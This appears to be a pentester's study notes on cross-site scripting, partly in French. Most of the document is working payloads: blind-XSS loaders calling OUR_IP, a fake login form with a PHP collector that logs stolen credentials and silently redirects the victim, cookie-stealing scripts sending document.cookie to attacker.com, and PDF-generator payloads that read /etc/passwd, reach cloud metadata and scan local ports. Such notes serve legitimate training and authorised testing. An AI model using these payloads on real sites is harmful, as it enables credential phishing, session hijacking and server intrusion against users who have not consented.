XSS vulnerabilities take advantage of a flaw in user input sanitization to "write" JavaScript code to the page and execute it on the client side, leading to several types of attacks. XSS vulnerabilities are solely executed on the client-side and hence do not directly affect the back-end server. They can only affect the user executing the vulnerability.
There are four main types of XSS vulnerabilities :

| Type                             | Description                                                                                                                                                                                                                                    |
| -------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Stored (Persistent) XSS`        | The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)                                                                                     |
| `Reflected (Non-Persistent) XSS` | Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message). Disapear after page refresh.                                                     |
| `DOM-based XSS`                  | Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)   |
| `Blind XSS`                      | Blind XSS vulnerability occurs when the vulnerability is triggered on a page we don't have access to (like contact forms, reviews, user details, support tickets, HTTP User-Agent header...). The XSS could be stored, reflected or DOM-based. |



# XSS Discovery
**Que 4 caractères à tester, s'ils sont réfléchis, alors il peut y avoir une XSS**
```bash
<
>
"
'
```
Attention : si le site convertis par exemple les chevrons d'ouverture `<` en `&lt;`, alors les entrées utilisateurs ont été dépolluées par un encodage des entités HTML (Output Encoding). Elles s'affichent comme du texte brut, mais ne peuvent exécuter de code. Donc **non vulnérable**.

## Automated
- Web application scanners (like [Nessus](https://www.tenable.com/products/nessus), [Burp Pro](https://portswigger.net/burp/pro), or [ZAP](https://www.zaproxy.org/))
- Common open-spirce tools can assist like [XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS), and [XSSer](https://github.com/epsylon/xsser).
## Manual
We can find huge lists of XSS payloads online, like the one on [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md) or the one in [PayloadBox](https://github.com/payloadbox/xss-payload-list).
```bash
# XSS Payloads
<script>alert(window.origin)</script>
<script>alert('XSS');</script>
<script>print()</script>
<script>alert(document.cookie)</script>
<img src="" onerror=alert(window.origin)>
<img src="" onerror=alert(document.cookie)>
```
**Note**: XSS can be injected into any input in the HTML page, which is not exclusive to HTML input fields, but may also be in `HTTP headers` like the `Cookie or User-Agent` (i.e., when their values are displayed on the page) !!
The most reliable method of detecting XSS vulnerabilities is manual code review, which should cover both back-end and front-end code !
## Blind-XSS
In this case, we'll not see how our input is being handled. To see which field is vulnerable and what XSS payload to use, we can load a `remote JavaScript script`. The following are a few examples we can use from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#blind-xss) :
```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```
To identify which field is vulnerable, we can put a script with the same name as the field we're injecting in
```html
<script src="http://OUR_IP/username"></script>
<script src="http://OUR_IP/password"></script>
<script src="http://OUR_IP/message"></script>
```
**Note:** We could avoid the email field because it often requires an email format, and the password field because it is often hashed.
Before sending the payload, we'll start a listener, and we should receive a response
```bash
sudo php -S 0.0.0.0:80
```



# XSS Attacks
## Phishing
Once we identify a working XSS payload, we can proceed to the phishing attack. We’ll display a login form on the targeted page, which will send the login info to a server we’re listening on. Here’s an example of a `HTML` login form :
```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```
We could put it into our payload. `OUR_IP` is the IP of the attacker, where we’ll later listen on
```bash
# Payload
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');
```
Then, when everything is set up, we can copy the URL and the XSS payload in its parameters and send it to the victim. This depends on the XSS type.
- To encourage the victim to use the login form, we should remove every `HTML element` that could make the user think he's not obliged to log in to use the site's functions. To do so, we'll use the JavaScript `document.getElementById().remove()` function with the HTLM element's `id`. We can find the `id` of every HTLM element in the source code of the page. 
```bash
# Payload w/ removing of an HTLM element "urlform"
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```
- We can also remove any payload tracks with comments, by adding an HTML opening comment after our XSS payload :
```bash
# Remove payload tracks on site w/ comments
...PAYLOAD... <!-- 
```
- Once everything is set up correctly, we can use a basic PHP script that logs the credentials from the HTTP request and then returns the victim to the original page without any injections. The victim will think that they successfully logged in and will use the site's function as intended.
```php
# index.php file
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```
When the `index.php` file is ready, we can start a PHP listening server
```bash
Enoxia@htb[/htb]$ mkdir /tmp/tmpserver
Enoxia@htb[/htb]$ cd /tmp/tmpserver
Enoxia@htb[/htb]$ vi index.php #at this step we wrote our index.php file
Enoxia@htb[/htb]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started

Enoxia@htb[/htb]$ cat creds.txt
Username: test | Password: test
```
## Session Hijacking
Cookies are used to maintain a user's session throughout different browsing sessions. This enables the user to only log in once and keep their logged-in session alive even if they visit the same website at another time or date. If we can execute `JavaScript` code on the victim's browser, we may be able to collect their cookies and gain logged-in access without knowing their credentials.
- We'll work here w/ a `Blind-XSS`. Like previously, we'll need to send a `JavaScript payload` to send us the data and a `PHP script` hosted on our server to grab the data. There are multiple JavaScript payloads we can use [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection#exploit-code-or-poc) :
```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```
We can write any of those payloads in a `script.js` file hosted on our machine, and put it in a `XSS payload` that was found working in the right field (username, message...)
```html
<script src=http://OUR_IP/script.js></script>
```
We can then start the `PHP server`
```bash
Enoxia@htb[/htb]$ sudo php -S 0.0.0.0:80
PHP 7.4.15 Development Server (http://0.0.0.0:80) started
```
We can write a PHP script `index.php` to split every cookie found (if many) with a new line and write them to a file. In this case, even if multiple victims trigger the XSS exploit, we'll get all of their cookies ordered in a file.
```php
# index.php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
Now we can send the XSS payload to the victim / the input field and wait for them to visit the vulnerable page. We'll then just have to use the cookie w/ our browser to access the page as the victim !

# Server-Side XSS (Dynamic PDF)
If a web page is creating a PDF using user controlled input, you can try to **trick the bot** that is creating the PDF into **executing arbitrary JS code**.
So, if the **PDF creator bot finds** some kind of HTML tags, it is going to interpret them, and you can abuse this behaviour to cause a **Server XSS**.

Please, notice that the `<script></script>` tags don’t work always, so you will need a different method to execute JS (for example, abusing `<img` ).

Also, note that in a regular exploitation you will be able to see/download the created pdf, so you will be able to see everything you write via JS (using document.write() for example). But, if you **cannot see** the created PDF, you will probably need **extract the information making web request to you** (Blind).

## Discovery Payloads
```bash
<!-- Basic discovery, Write something-->
<img src="x" onerror="document.write('test')" />
<script>document.write(JSON.stringify(window.location))</script>
<script>document.write('<iframe src="'+window.location.href+'"></iframe>')</script>

<!--Basic blind discovery, load a resource-->
<img src="http://attacker.com"/>
<img src=x onerror="location.href='http://attacker.com/?c='+ document.cookie">
<script>new Image().src="http://attacker.com/?c="+encodeURI(document.cookie);</script>
<link rel=attachment href="http://attacker.com">

<!-- Using base HTML tag -->
<base href="http://attacker.com" />

<!-- Loading external stylesheet -->
<link rel="stylesheet" src="http://attacker.com" />

<!-- Meta-tag to auto-refresh page -->
<meta http-equiv="refresh" content="0; url=http://attacker.com/" />

<!-- Loading external components -->
<input type="image" src="http://attacker.com" />
<video src="http://attacker.com" />
<audio src="http://attacker.com" />
<audio><source src="http://attacker.com"/></audio>
<svg src="http://attacker.com" />
```

### SVG
Any of the previous of following payloads may be used inside this SVG payload. One iframe accessing Burpcollab subdomain and another one accessing the metadata endpoint are put as examples.
We can find more [SVG payloads](https://github.com/allanlw/svg-cheatsheet) here
```bash
<svg xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="root" width="800" height="500">
    <g>
        <foreignObject width="800" height="500">
            <body xmlns="http://www.w3.org/1999/xhtml">
                <iframe src="http://redacted.burpcollaborator.net" width="800" height="500"></iframe>
                <iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="500"></iframe>
            </body>
        </foreignObject>
    </g>
</svg>


<svg width="100%" height="100%" viewBox="0 0 100 100"
     xmlns="http://www.w3.org/2000/svg">
  <circle cx="50" cy="50" r="45" fill="green"
          id="foo"/>
  <script type="text/javascript">
    // <![CDATA[
      alert(1);
   // ]]>
  </script>
</svg>
```
### Path Disclosure
```bash
<!-- If the bot is accessing a file:// path, you will discover the internal path
if not, you will at least have wich path the bot is accessing -->
<img src="x" onerror="document.write(window.location)" />
<script> document.write(window.location) </script>
```
### Load an external script
The best conformable way to exploit this vulnerability is to abuse the vulnerability to make the bot load a script you control locally. Then, you will be able to change the payload locally and make the bot load it with the same code every time.
```bash
<script src="http://attacker.com/myscripts.js"></script>
<img src="xasdasdasd" onerror="document.write('<script src="https://attacker.com/test.js"></script>')"/>
```
### Read local file / SSRF
!!! Change `file:///etc/passwd` for `http://169.254.169.254/latest/user-data` for example to try to access an external web page (SSRF).
If SSRF is allowed, but you cannot reach an interesting domain or IP, [check this page for potential bypasses](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass.html). !!!
```bash
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(btoa(this.responseText))};
x.open("GET","file:///etc/passwd");x.send();
</script>
```

```bash
<script>
    xhzeem = new XMLHttpRequest();
    xhzeem.onload = function(){document.write(this.responseText);}
    xhzeem.onerror = function(){document.write('failed!')}
    xhzeem.open("GET","file:///etc/passwd");
    xhzeem.send();
</script>
```

```bash
<iframe src=file:///etc/passwd></iframe>
<img src="xasdasdasd" onerror="document.write('<iframe src=file:///etc/passwd></iframe>')"/>
<link rel=attachment href="file:///root/secret.txt">
<object data="file:///etc/passwd">
<portal src="file:///etc/passwd" id=portal>
<embed src="file:///etc/passwd>" width="400" height="400">
<style><iframe src="file:///etc/passwd">
<img src='x' onerror='document.write('<iframe src=file:///etc/passwd></iframe>')'/>&text=&width=500&height=500
<meta http-equiv="refresh" content="0;url=file:///etc/passwd" />
```

```bash
<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="Attached File: /etc/passwd" pos-x="195" />
```

### Bot delay

```bash
<!--Make the bot send a ping every 500ms to check how long does the bot wait-->
<script>
    let time = 500;
    setInterval(()=>{
        let img = document.createElement("img");
        img.src = `https://attacker.com/ping?time=${time}ms`;
        time += 500;
    }, 500);
</script>
<img src="https://attacker.com/delay">
```

### Port Scan

```bash
<!--Scan local port and receive a ping indicating which ones are found-->
<script>
const checkPort = (port) => {
    fetch(`http://localhost:${port}`, { mode: "no-cors" }).then(() => {
        let img = document.createElement("img");
        img.src = `http://attacker.com/ping?port=${port}`;
    });
}

for(let i=0; i<1000; i++) {
    checkPort(i);
}
</script>
<img src="https://attacker.com/startingScan">
```

This vulnerability can be transformed very easily in a **[SSRF](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html)** (as you can make the script load external resources). So just try to exploit it (read some metadata?).

### Attachments: PD4ML
There are some HTML 2 PDF engines that allow to **specify attachments for the PDF**, like **PD4ML**. You can abuse this feature to **attach any local file** to the PDF.
To open the attachment I opened the file with **Firefox and double clicked the Paperclip symbol** to **store the attachment** as a new file.
Capturing the **PDF response** with burp should also **show the attachment in cleat text** inside the PDF.
```bash
<!-- From https://0xdf.gitlab.io/2021/04/24/htb-bucket.html -->
<html>
  <pd4ml:attachment
    src="/etc/passwd"
    description="attachment sample"
    icon="Paperclip" />
</html>
```
